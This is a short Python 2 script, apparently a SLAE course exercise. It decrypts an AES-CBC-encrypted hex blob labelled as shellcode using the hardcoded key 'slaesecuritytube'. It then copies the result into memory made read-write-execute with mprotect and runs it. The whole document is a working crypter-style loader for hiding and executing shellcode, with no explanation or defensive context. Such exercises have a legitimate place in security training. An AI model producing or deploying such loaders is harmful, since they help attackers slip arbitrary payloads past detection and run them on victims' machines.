# aes_decrypter
# Author: buffered4ever
# 15-03-2019

#!/usr/bin/env python

import ctypes
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import base64
import binascii

from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__(self, key):
        self.key = key


    def decrypt( self, enc ):
        #enc = base64.b64decode(enc)
        enc = enc.decode('hex')
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt(enc[16:]))


cipher = AESCipher('slaesecuritytube')
encrypted = 'fc3b9277df2f7e7178988fe013a88b71f54ffc92e0799dfc0b879efeb82743f15f40dbcf1431f528ec35f6f7f85115f3'
decrypted = cipher.decrypt(encrypted).encode('hex')
print "Decrypted shellcode: " + decrypted


libc = CDLL('libc.so.6')

shellcode = decrypted.decode('hex')

sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
print "Executing Shellcode"
run()

